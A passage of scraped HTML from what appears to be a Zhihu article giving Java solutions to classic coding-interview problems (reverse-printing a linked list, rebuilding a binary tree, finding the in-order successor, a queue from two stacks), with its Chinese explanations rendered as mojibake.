src=\"https://pic2.zhimg.com/v2-bf654bd371af9d72f569c3fece1f1ec5_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"444\" data-rawheight=\"235\" class=\"origin_image zh-lightbox-thumb\" width=\"444\" data-original=\"https://pic2.zhimg.com/v2-bf654bd371af9d72f569c3fece1f1ec5_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;444&#39; height=&#39;235&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"444\" data-rawheight=\"235\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"444\" data-original=\"https://pic2.zhimg.com/v2-bf654bd371af9d72f569c3fece1f1ec5_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-bf654bd371af9d72f569c3fece1f1ec5_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>è§£é¢˜æ€è·¯</h2><h3>ä½¿ç”¨é€’å½’</h3><p>è¦é€†åºæ‰“å°é“¾è¡¨ 1-&gt;2-&gt;3ï¼ˆ3,2,1)ï¼Œå¯ä»¥å…ˆé€†åºæ‰“å°é“¾è¡¨ 2-&gt;3(3,2)ï¼Œæœ€åå†æ‰“å°ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ 1ã€‚è€Œé“¾è¡¨ 2-&gt;3 å¯ä»¥çœ‹æˆä¸€ä¸ªæ–°çš„é“¾è¡¨ï¼Œè¦é€†åºæ‰“å°è¯¥é“¾è¡¨å¯ä»¥ç»§ç»­ä½¿ç”¨æ±‚è§£å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯åœ¨æ±‚è§£å‡½æ•°ä¸­è°ƒç”¨è‡ªå·±ï¼Œè¿™å°±æ˜¯é€’å½’å‡½æ•°ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"nf\">printListFromTailToHead</span><span class=\"o\">(</span><span class=\"n\">ListNode</span> <span class=\"n\">listNode</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"n\">ret</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;&gt;();</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">listNode</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">ret</span><span class=\"o\">.</span><span class=\"na\">addAll</span><span class=\"o\">(</span><span class=\"n\">printListFromTailToHead</span><span class=\"o\">(</span><span class=\"n\">listNode</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">));</span>\n        <span class=\"n\">ret</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">listNode</span><span class=\"o\">.</span><span class=\"na\">val</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"n\">ret</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h3>ä½¿ç”¨å¤´æ’æ³•</h3><p>ä½¿ç”¨å¤´æ’æ³•å¯ä»¥å¾—åˆ°ä¸€ä¸ªé€†åºçš„é“¾è¡¨ã€‚</p><p>å¤´ç»“ç‚¹å’Œç¬¬ä¸€ä¸ªèŠ‚ç‚¹çš„åŒºåˆ«ï¼š</p><ul><li>å¤´ç»“ç‚¹æ˜¯åœ¨å¤´æ’æ³•ä¸­ä½¿ç”¨çš„ä¸€ä¸ªé¢å¤–èŠ‚ç‚¹ï¼Œè¿™ä¸ªèŠ‚ç‚¹ä¸å­˜å‚¨å€¼ï¼›</li><li>ç¬¬ä¸€ä¸ªèŠ‚ç‚¹å°±æ˜¯é“¾è¡¨çš„ç¬¬ä¸€ä¸ªçœŸæ­£å­˜å‚¨å€¼çš„èŠ‚ç‚¹ã€‚</li></ul><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-800c015fdcbe7d0e5a1d2b7f06d3783d_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"632\" data-rawheight=\"347\" data-thumbnail=\"https://pic2.zhimg.com/v2-800c015fdcbe7d0e5a1d2b7f06d3783d_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"632\" data-original=\"https://pic2.zhimg.com/v2-800c015fdcbe7d0e5a1d2b7f06d3783d_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;632&#39; height=&#39;347&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"632\" data-rawheight=\"347\" data-thumbnail=\"https://pic2.zhimg.com/v2-800c015fdcbe7d0e5a1d2b7f06d3783d_b.jpg\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"632\" data-original=\"https://pic2.zhimg.com/v2-800c015fdcbe7d0e5a1d2b7f06d3783d_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-800c015fdcbe7d0e5a1d2b7f06d3783d_b.gif\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"nf\">printListFromTailToHead</span><span class=\"o\">(</span><span class=\"n\">ListNode</span> <span class=\"n\">listNode</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"c1\">// å¤´æ’æ³•æ„å»ºé€†åºé“¾è¡¨\n</span><span class=\"c1\"></span>    <span class=\"n\">ListNode</span> <span class=\"n\">head</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ListNode</span><span class=\"o\">(-</span><span class=\"n\">1</span><span class=\"o\">);</span>\n    <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">listNode</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">ListNode</span> <span class=\"n\">memo</span> <span class=\"o\">=</span> <span class=\"n\">listNode</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n        <span class=\"n\">listNode</span><span class=\"o\">.</span><span class=\"na\">next</span> <span class=\"o\">=</span> <span class=\"n\">head</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n        <span class=\"n\">head</span><span class=\"o\">.</span><span class=\"na\">next</span> <span class=\"o\">=</span> <span class=\"n\">listNode</span><span class=\"o\">;</span>\n        <span class=\"n\">listNode</span> <span class=\"o\">=</span> <span class=\"n\">memo</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n    <span class=\"c1\">// æ„å»º ArrayList\n</span><span class=\"c1\"></span>    <span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"n\">ret</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;&gt;();</span>\n    <span class=\"n\">head</span> <span class=\"o\">=</span> <span class=\"n\">head</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n    <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">head</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">ret</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">head</span><span class=\"o\">.</span><span class=\"na\">val</span><span class=\"o\">);</span>\n        <span class=\"n\">head</span> <span class=\"o\">=</span> <span class=\"n\">head</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"n\">ret</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h3>ä½¿ç”¨æ ˆ</h3><p>æ ˆå…·æœ‰åè¿›å…ˆå‡ºçš„ç‰¹ç‚¹ï¼Œåœ¨éå†é“¾è¡¨æ—¶å°†å€¼æŒ‰é¡ºåºæ”¾å…¥æ ˆä¸­ï¼Œæœ€åå‡ºæ ˆçš„é¡ºåºå³ä¸ºé€†åºã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-6d9db2f8df9c41e3c24d77d2ce8f0789_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"566\" data-rawheight=\"672\" data-thumbnail=\"https://pic2.zhimg.com/v2-6d9db2f8df9c41e3c24d77d2ce8f0789_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"566\" data-original=\"https://pic2.zhimg.com/v2-6d9db2f8df9c41e3c24d77d2ce8f0789_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;566&#39; height=&#39;672&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"566\" data-rawheight=\"672\" data-thumbnail=\"https://pic2.zhimg.com/v2-6d9db2f8df9c41e3c24d77d2ce8f0789_b.jpg\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"566\" data-original=\"https://pic2.zhimg.com/v2-6d9db2f8df9c41e3c24d77d2ce8f0789_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-6d9db2f8df9c41e3c24d77d2ce8f0789_b.gif\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"nf\">printListFromTailToHead</span><span class=\"o\">(</span><span class=\"n\">ListNode</span> <span class=\"n\">listNode</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"n\">Stack</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"n\">stack</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Stack</span><span class=\"o\">&lt;&gt;();</span>\n    <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">listNode</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">stack</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">listNode</span><span class=\"o\">.</span><span class=\"na\">val</span><span class=\"o\">);</span>\n        <span class=\"n\">listNode</span> <span class=\"o\">=</span> <span class=\"n\">listNode</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n    <span class=\"n\">ArrayList</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"n\">ret</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;&gt;();</span>\n    <span class=\"k\">while</span> <span class=\"o\">(!</span><span class=\"n\">stack</span><span class=\"o\">.</span><span class=\"na\">isEmpty</span><span class=\"o\">())</span>\n        <span class=\"n\">ret</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">stack</span><span class=\"o\">.</span><span class=\"na\">pop</span><span class=\"o\">());</span>\n    <span class=\"k\">return</span> <span class=\"n\">ret</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>7. é‡å»ºäºŒå‰æ ‘</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/8a19cbe657394eeaac2f6ea9b0f6fcf6%3FtpId%3D13%26tqId%3D11157%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>æ ¹æ®äºŒå‰æ ‘çš„å‰åºéå†å’Œä¸­åºéå†çš„ç»“æœï¼Œé‡å»ºå‡ºè¯¥äºŒå‰æ ‘ã€‚å‡è®¾è¾“å…¥çš„å‰åºéå†å’Œä¸­åºéå†çš„ç»“æœä¸­éƒ½ä¸å«é‡å¤çš„æ•°å­—ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-27f8a8310213226379d6a24dd19ee8e3_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"552\" data-rawheight=\"593\" class=\"origin_image zh-lightbox-thumb\" width=\"552\" data-original=\"https://pic4.zhimg.com/v2-27f8a8310213226379d6a24dd19ee8e3_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;552&#39; height=&#39;593&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"552\" data-rawheight=\"593\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"552\" data-original=\"https://pic4.zhimg.com/v2-27f8a8310213226379d6a24dd19ee8e3_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-27f8a8310213226379d6a24dd19ee8e3_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>è§£é¢˜æ€è·¯</h2><p>å‰åºéå†çš„ç¬¬ä¸€ä¸ªå€¼ä¸ºæ ¹èŠ‚ç‚¹çš„å€¼ï¼Œä½¿ç”¨è¿™ä¸ªå€¼å°†ä¸­åºéå†ç»“æœåˆ†æˆä¸¤éƒ¨åˆ†ï¼Œå·¦éƒ¨åˆ†ä¸ºæ ‘çš„å·¦å­æ ‘ä¸­åºéå†ç»“æœï¼Œå³éƒ¨åˆ†ä¸ºæ ‘çš„å³å­æ ‘ä¸­åºéå†çš„ç»“æœã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-81d0ed342a1fe627e279efa8693bba94_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"587\" data-rawheight=\"601\" data-thumbnail=\"https://pic1.zhimg.com/v2-81d0ed342a1fe627e279efa8693bba94_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"587\" data-original=\"https://pic1.zhimg.com/v2-81d0ed342a1fe627e279efa8693bba94_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;587&#39; height=&#39;601&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"587\" data-rawheight=\"601\" data-thumbnail=\"https://pic1.zhimg.com/v2-81d0ed342a1fe627e279efa8693bba94_b.jpg\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"587\" data-original=\"https://pic1.zhimg.com/v2-81d0ed342a1fe627e279efa8693bba94_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-81d0ed342a1fe627e279efa8693bba94_b.gif\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"c1\">// ç¼“å­˜ä¸­åºéå†æ•°ç»„æ¯ä¸ªå€¼å¯¹åº”çš„ç´¢å¼•\n</span><span class=\"c1\"></span><span class=\"kd\">private</span> <span class=\"n\">Map</span><span class=\"o\">&lt;</span><span class=\"n\">Integer</span><span class=\"o\">,</span> <span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"n\">indexForInOrders</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">HashMap</span><span class=\"o\">&lt;&gt;();</span>\n\n<span class=\"kd\">public</span> <span class=\"n\">TreeNode</span> <span class=\"nf\">reConstructBinaryTree</span><span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">pre</span><span class=\"o\">,</span> <span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">in</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">in</span><span class=\"o\">.</span><span class=\"na\">length</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span>\n        <span class=\"n\">indexForInOrders</span><span class=\"o\">.</span><span class=\"na\">put</span><span class=\"o\">(</span><span class=\"n\">in</span><span class=\"o\">[</span><span class=\"n\">i</span><span class=\"o\">],</span> <span class=\"n\">i</span><span class=\"o\">);</span>\n    <span class=\"k\">return</span> <span class=\"n\">reConstructBinaryTree</span><span class=\"o\">(</span><span class=\"n\">pre</span><span class=\"o\">,</span> <span class=\"n\">0</span><span class=\"o\">,</span> <span class=\"n\">pre</span><span class=\"o\">.</span><span class=\"na\">length</span> <span class=\"o\">-</span> <span class=\"n\">1</span><span class=\"o\">,</span> <span class=\"n\">0</span><span class=\"o\">);</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">private</span> <span class=\"n\">TreeNode</span> <span class=\"nf\">reConstructBinaryTree</span><span class=\"o\">(</span><span class=\"kt\">int</span><span class=\"o\">[]</span> <span class=\"n\">pre</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">preL</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">preR</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">inL</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">preL</span> <span class=\"o\">&gt;</span> <span class=\"n\">preR</span><span class=\"o\">)</span>\n        <span class=\"k\">return</span> <span class=\"kc\">null</span><span class=\"o\">;</span>\n    <span class=\"n\">TreeNode</span> <span class=\"n\">root</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">TreeNode</span><span class=\"o\">(</span><span class=\"n\">pre</span><span class=\"o\">[</span><span class=\"n\">preL</span><span class=\"o\">]);</span>\n    <span class=\"kt\">int</span> <span class=\"n\">inIndex</span> <span class=\"o\">=</span> <span class=\"n\">indexForInOrders</span><span class=\"o\">.</span><span class=\"na\">get</span><span class=\"o\">(</span><span class=\"n\">root</span><span class=\"o\">.</span><span class=\"na\">val</span><span class=\"o\">);</span>\n    <span class=\"kt\">int</span> <span class=\"n\">leftTreeSize</span> <span class=\"o\">=</span> <span class=\"n\">inIndex</span> <span class=\"o\">-</span> <span class=\"n\">inL</span><span class=\"o\">;</span>\n    <span class=\"n\">root</span><span class=\"o\">.</span><span class=\"na\">left</span> <span class=\"o\">=</span> <span class=\"n\">reConstructBinaryTree</span><span class=\"o\">(</span><span class=\"n\">pre</span><span class=\"o\">,</span> <span class=\"n\">preL</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">,</span> <span class=\"n\">preL</span> <span class=\"o\">+</span> <span class=\"n\">leftTreeSize</span><span class=\"o\">,</span> <span class=\"n\">inL</span><span class=\"o\">);</span>\n    <span class=\"n\">root</span><span class=\"o\">.</span><span class=\"na\">right</span> <span class=\"o\">=</span> <span class=\"n\">reConstructBinaryTree</span><span class=\"o\">(</span><span class=\"n\">pre</span><span class=\"o\">,</span> <span class=\"n\">preL</span> <span class=\"o\">+</span> <span class=\"n\">leftTreeSize</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">,</span> <span class=\"n\">preR</span><span class=\"o\">,</span> <span class=\"n\">inL</span> <span class=\"o\">+</span> <span class=\"n\">leftTreeSize</span> <span class=\"o\">+</span> <span class=\"n\">1</span><span class=\"o\">);</span>\n    <span class=\"k\">return</span> <span class=\"n\">root</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>8. äºŒå‰æ ‘çš„ä¸‹ä¸€ä¸ªç»“ç‚¹</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/9023a0c988684a53960365b889ceaf5e%3FtpId%3D13%26tqId%3D11210%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>ç»™å®šä¸€ä¸ªäºŒå‰æ ‘å’Œå…¶ä¸­çš„ä¸€ä¸ªç»“ç‚¹ï¼Œè¯·æ‰¾å‡ºä¸­åºéå†é¡ºåºçš„ä¸‹ä¸€ä¸ªç»“ç‚¹å¹¶ä¸”è¿”å›ã€‚æ³¨æ„ï¼Œæ ‘ä¸­çš„ç»“ç‚¹ä¸ä»…åŒ…å«å·¦å³å­ç»“ç‚¹ï¼ŒåŒæ—¶åŒ…å«æŒ‡å‘çˆ¶ç»“ç‚¹çš„æŒ‡é’ˆã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">TreeLinkNode</span> <span class=\"o\">{</span>\n\n    <span class=\"kt\">int</span> <span class=\"n\">val</span><span class=\"o\">;</span>\n    <span class=\"n\">TreeLinkNode</span> <span class=\"n\">left</span> <span class=\"o\">=</span> <span class=\"kc\">null</span><span class=\"o\">;</span>\n    <span class=\"n\">TreeLinkNode</span> <span class=\"n\">right</span> <span class=\"o\">=</span> <span class=\"kc\">null</span><span class=\"o\">;</span>\n    <span class=\"n\">TreeLinkNode</span> <span class=\"n\">next</span> <span class=\"o\">=</span> <span class=\"kc\">null</span><span class=\"o\">;</span>\n\n    <span class=\"n\">TreeLinkNode</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">val</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">val</span> <span class=\"o\">=</span> <span class=\"n\">val</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><h2>è§£é¢˜æ€è·¯</h2><p>â‘  å¦‚æœä¸€ä¸ªèŠ‚ç‚¹çš„å³å­æ ‘ä¸ä¸ºç©ºï¼Œé‚£ä¹ˆè¯¥èŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªèŠ‚ç‚¹æ˜¯å³å­æ ‘çš„æœ€å·¦èŠ‚ç‚¹ï¼›</p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-fcec11861486522e3dad8d8dc9d3f136_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"380\" data-rawheight=\"467\" data-thumbnail=\"https://pic3.zhimg.com/v2-fcec11861486522e3dad8d8dc9d3f136_b.jpg\" class=\"content_image\" width=\"380\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;380&#39; height=&#39;467&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"380\" data-rawheight=\"467\" data-thumbnail=\"https://pic3.zhimg.com/v2-fcec11861486522e3dad8d8dc9d3f136_b.jpg\" class=\"content_image lazy\" width=\"380\" data-actualsrc=\"https://pic3.zhimg.com/v2-fcec11861486522e3dad8d8dc9d3f136_b.gif\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>â‘¡ å¦åˆ™ï¼Œå‘ä¸Šæ‰¾ç¬¬ä¸€ä¸ªå·¦é“¾æ¥æŒ‡å‘çš„æ ‘åŒ…å«è¯¥èŠ‚ç‚¹çš„ç¥–å…ˆèŠ‚ç‚¹ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-7c2c842a66aa96edb8121dc0df53cea7_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"329\" data-rawheight=\"474\" data-thumbnail=\"https://pic4.zhimg.com/v2-7c2c842a66aa96edb8121dc0df53cea7_b.jpg\" class=\"content_image\" width=\"329\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;329&#39; height=&#39;474&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"329\" data-rawheight=\"474\" data-thumbnail=\"https://pic4.zhimg.com/v2-7c2c842a66aa96edb8121dc0df53cea7_b.jpg\" class=\"content_image lazy\" width=\"329\" data-actualsrc=\"https://pic4.zhimg.com/v2-7c2c842a66aa96edb8121dc0df53cea7_b.gif\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"n\">TreeLinkNode</span> <span class=\"nf\">GetNext</span><span class=\"o\">(</span><span class=\"n\">TreeLinkNode</span> <span class=\"n\">pNode</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">pNode</span><span class=\"o\">.</span><span class=\"na\">right</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">TreeLinkNode</span> <span class=\"n\">node</span> <span class=\"o\">=</span> <span class=\"n\">pNode</span><span class=\"o\">.</span><span class=\"na\">right</span><span class=\"o\">;</span>\n        <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">node</span><span class=\"o\">.</span><span class=\"na\">left</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">)</span>\n            <span class=\"n\">node</span> <span class=\"o\">=</span> <span class=\"n\">node</span><span class=\"o\">.</span><span class=\"na\">left</span><span class=\"o\">;</span>\n        <span class=\"k\">return</span> <span class=\"n\">node</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span> <span class=\"k\">else</span> <span class=\"o\">{</span>\n        <span class=\"k\">while</span> <span class=\"o\">(</span><span class=\"n\">pNode</span><span class=\"o\">.</span><span class=\"na\">next</span> <span class=\"o\">!=</span> <span class=\"kc\">null</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"n\">TreeLinkNode</span> <span class=\"n\">parent</span> <span class=\"o\">=</span> <span class=\"n\">pNode</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n            <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">parent</span><span class=\"o\">.</span><span class=\"na\">left</span> <span class=\"o\">==</span> <span class=\"n\">pNode</span><span class=\"o\">)</span>\n                <span class=\"k\">return</span> <span class=\"n\">parent</span><span class=\"o\">;</span>\n            <span class=\"n\">pNode</span> <span class=\"o\">=</span> <span class=\"n\">pNode</span><span class=\"o\">.</span><span class=\"na\">next</span><span class=\"o\">;</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n    <span class=\"k\">return</span> <span class=\"kc\">null</span><span class=\"o\">;</span>\n<span class=\"o\">}</span></code></pre></div><h2>9. ç”¨ä¸¤ä¸ªæ ˆå®ç°é˜Ÿåˆ—</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//www.nowcoder.com/practice/54275ddae22f475981afa2244dd448c6%3FtpId%3D13%26tqId%3D11158%26tPage%3D1%26rp%3D1%26ru%3D/ta/coding-interviews%26qru%3D/ta/coding-interviews/question-ranking\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NowCoder</a></p><h2>é¢˜ç›®æè¿°</h2><p>ç”¨ä¸¤ä¸ªæ ˆæ¥å®ç°ä¸€ä¸ªé˜Ÿåˆ—ï¼Œå®Œæˆé˜Ÿåˆ—çš„ Push å’Œ Pop æ“ä½œã€‚</p><h2>è§£é¢˜æ€è·¯</h2><p>in æ ˆç”¨æ¥å¤„ç†å…¥æ ˆï¼ˆpushï¼‰æ“ä½œï¼Œout æ ˆç”¨æ¥å¤„ç†å‡ºæ ˆï¼ˆpopï¼‰æ“ä½œã€‚ä¸€ä¸ªå…ƒç´ è¿›å…¥ in æ ˆä¹‹åï¼Œå‡ºæ ˆçš„é¡ºåºè¢«åè½¬ã€‚å½“å…ƒç´ è¦å‡ºæ ˆæ—¶ï¼Œéœ€è¦å…ˆè¿›å…¥ out æ ˆï¼Œæ­¤æ—¶å…ƒç´ å‡ºæ ˆé¡ºåºå†ä¸€æ¬¡è¢«åè½¬ï¼Œå› æ­¤å‡ºæ ˆé¡ºåºå°±å’Œæœ€å¼€å§‹å…¥æ ˆé¡ºåºæ˜¯ç›¸åŒçš„ï¼Œå…ˆè¿›å…¥çš„å…ƒç´ å…ˆé€€å‡ºï¼Œè¿™å°±æ˜¯é˜Ÿåˆ—çš„é¡ºåºã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-aaa9b59f2d5f8f9c638bfcf96d5f3654_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"659\" data-rawheight=\"524\" data-thumbnail=\"https://pic1.zhimg.com/v2-aaa9b59f2d5f8f9c638bfcf96d5f3654_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"659\" data-original=\"https://pic1.zhimg.com/v2-aaa9b59f2d5f8f9c638bfcf96d5f3654_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;659&#39; 